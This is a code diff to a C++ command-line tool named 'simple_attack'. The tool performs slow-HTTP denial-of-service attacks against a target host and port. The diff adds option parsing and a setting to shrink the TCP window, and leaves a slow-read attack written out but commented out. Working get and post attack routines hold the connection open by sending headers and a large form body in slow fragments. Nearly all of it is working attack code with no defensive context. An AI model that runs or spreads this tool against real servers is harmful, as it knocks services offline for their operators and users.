@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <getopt.h>
 #include <errno.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -10,13 +11,15 @@
 #include <vector>
 #define ERRNOSTR   strerror(errno)
 #define error(...) { fprintf(stderr, __VA_ARGS__); exit(1); }
+#define VOID(r)    { (void)(r + 1); }
 using namespace std;
 
 
 string host_header;  // HTTP header Host
 
 // Return socket Fd; host can be either hostname or IP address.
-int connect_TCP(const char* host, unsigned short port) {
+// win_size: TCP window size
+int connect_TCP(const char* host, unsigned short port, int win_size=-1) {
     struct sockaddr_in addr;
     struct addrinfo* info;
     int sockFd;
@@ -32,6 +35,10 @@ int connect_TCP(const char* host, unsigned short port) {
 
     if ((sockFd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         error("Cannot create socket: %s\n", ERRNOSTR);
+    }
+    if (win_size > 0) {
+        int r = setsockopt(sockFd, SOL_SOCKET, SO_RCVBUF, &win_size, sizeof(win_size));
+        if (r < 0) error("Cannot set window size: %s\n", ERRNOSTR);
     }
     if ((connect(sockFd, (struct sockaddr*)&addr, sizeof(addr))) < 0) {
         error("Cannot connect to %s (%d): %s\n", inet_ntoa(addr.sin_addr), \
@@ -55,7 +62,7 @@ void get_attack(int sock, int delay=3) {
     };
 
     for (string m : msg) {
-        write(sock, m.c_str(), m.size());
+        VOID(write(sock, m.c_str(), m.size()));
         printf("%s\n", m.c_str());
         sleep(delay);
     }
@@ -100,41 +107,92 @@ void post_attack(int sock, int iteration=100, bool form=false, int data_rate=600
     }
 
     for (string h : header) {
-        write(sock, h.c_str(), h.size());
+        VOID(write(sock, h.c_str(), h.size()));
     }
     for (int i = 0; i < iteration; i++) {
-        write(sock, body.c_str(), body.size());
+        VOID(write(sock, body.c_str(), body.size()));
         printf("[%d / %d] %s...\n", i, iteration, body.substr(0, 80).c_str());
         if (i + 50 >= iteration) {
             sleep(1);
         }
     }
-    write(sock, tail.c_str(), tail.size());
+    VOID(write(sock, tail.c_str(), tail.size()));
 }
+
+// Make sure to also set TCP window size small
+// void read_attack(int sock, string path, int data_rate=600) {
+//     vector<string> request = {
+//         string("GET ") + ((path[0] != '/') ? "/" : "") + path + " HTTP/1.1\r\n",
+//         host_header,
+//         "\r\n"
+//     };
+//     char* buf = (char*)malloc(data_rate);
+
+//     for (auto r : request) {
+//         VOID(write(sock, r.c_str(), r.size()));
+//     }
+//     while (sleep(1) == 0) {
+//         printf("%lu: %d\n", time(NULL), read(sock, buf, data_rate));
+//     }
+
+//     free(buf);
+// }
 
 void read_response(int sock) {
     char buf[1025];
 
     sleep(1);
-    read(sock, buf, 1024);
+    VOID(read(sock, buf, 1024));
     printf("%s\n", buf);
 }
 
-int main(int argc, char* argv[]) {
-    if (argc < 3) {
-        printf("SYNOPSIS\n\t%s <host> <port> [size]\n", argv[0]);
-        printf("\thost\tThe address of the target.\n");
-        printf("\tport\tThe port of the target.\n");
-        printf("\tsize\tThe size of http body in KB. (default=1024)\n");
-        exit(0);
-    }
-    host_header = "Host: " + string(argv[1]) + ":" + string(argv[2]) + "\r\n";
-    int body_size = (argc >= 4) ? atoi(argv[3]) * 1024 : 1024 * 1024;
+void help() {
+    auto print_opt = [](auto name, auto des) {
+        printf("  %-22s%s\n", name, des);
+    };
+    printf("Usage: simple_attack [OPTIONS] <host> <port>\n");
+    print_opt("host", "The address of the target.");
+    print_opt("port", "The port of the target.");
 
-    int sock = connect_TCP(argv[1], atoi(argv[2]));
+    printf("\nOptions:\n");
+    print_opt("-s <size>", "The size of http body in KB. (default=1024)");
+    print_opt("-p <path>", "The URL path for read attack. (default=/)");
+    print_opt("-h", "Display this help message.");
+}
+
+int main(int argc, char* argv[]) {
+    int body_size = 1024 * 1024;
+    string path = "/";
+    char c;
+    while ((c = getopt(argc, argv, "s:p:h")) > 0) {
+        switch (c) {
+        case 's':
+            body_size = atoi(optarg) * 1024;
+            break;
+        case 'p':
+            path = string(optarg);
+            break;
+        case 'h':
+            help();
+            return 1;
+        default:
+            return 1;
+        }
+    }
+    // two more positional arguments
+    if (optind + 2 > argc) {
+        help();
+        return 1;
+    }
+    const char* host = argv[optind++];
+    unsigned short port = atoi(argv[optind++]);
+
+    host_header = "Host: " + string(host) + ":" + to_string(port) + "\r\n";
+    int sock = connect_TCP(host, port);
 
     // get_attack(sock);
     post_attack(sock, body_size / 600, true);
+    // read_attack(sock, path);
 
     read_response(sock);
     return 0;
